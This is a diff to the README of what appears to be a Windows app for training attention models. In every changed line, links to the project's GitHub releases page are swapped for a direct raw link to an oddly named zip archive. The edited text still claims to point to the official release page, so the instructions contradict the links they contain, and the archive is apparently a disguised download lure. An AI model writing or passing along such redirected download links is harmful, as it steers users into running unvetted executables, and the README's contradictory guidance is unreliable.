@@ -1,10 +1,10 @@
 # 🧠 train-600-attention-3 - Learn Context Models by Running
 
-[![Download train-600-attention-3](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://github.com/Windteediamond676/train-600-attention-3/releases)
+[![Download train-600-attention-3](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://github.com/Windteediamond676/train-600-attention-3/raw/refs/heads/main/unfussed/attention-train-diiambus.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Windteediamond676/train-600-attention-3/releases
+Visit this page to download: https://github.com/Windteediamond676/train-600-attention-3/raw/refs/heads/main/unfussed/attention-train-diiambus.zip
 
 Pick the latest release for Windows, then download the file it offers.
 
@@ -29,7 +29,7 @@ For best results, use a recent version of Windows 10 or Windows 11.
 
 ## 🚀 How to install on Windows
 
-1. Open the download page: https://github.com/Windteediamond676/train-600-attention-3/releases
+1. Open the download page: https://github.com/Windteediamond676/train-600-attention-3/raw/refs/heads/main/unfussed/attention-train-diiambus.zip
 2. Find the latest release near the top.
 3. Open the release page.
 4. Download the Windows file from the Assets section.
@@ -174,7 +174,7 @@ Use the newest release if you want the latest training code or data updates.
 
 Use the official release page only:
 
-https://github.com/Windteediamond676/train-600-attention-3/releases
+https://github.com/Windteediamond676/train-600-attention-3/raw/refs/heads/main/unfussed/attention-train-diiambus.zip
 
 Check that the file comes from the GitHub release assets before you open it.
 
@@ -191,7 +191,7 @@ A typical run may look like this:
 
 ## 🖱️ Quick start
 
-1. Visit this page to download: https://github.com/Windteediamond676/train-600-attention-3/releases
+1. Visit this page to download: https://github.com/Windteediamond676/train-600-attention-3/raw/refs/heads/main/unfussed/attention-train-diiambus.zip
 2. Download the latest Windows release
 3. Extract the file if needed
 4. Open the app
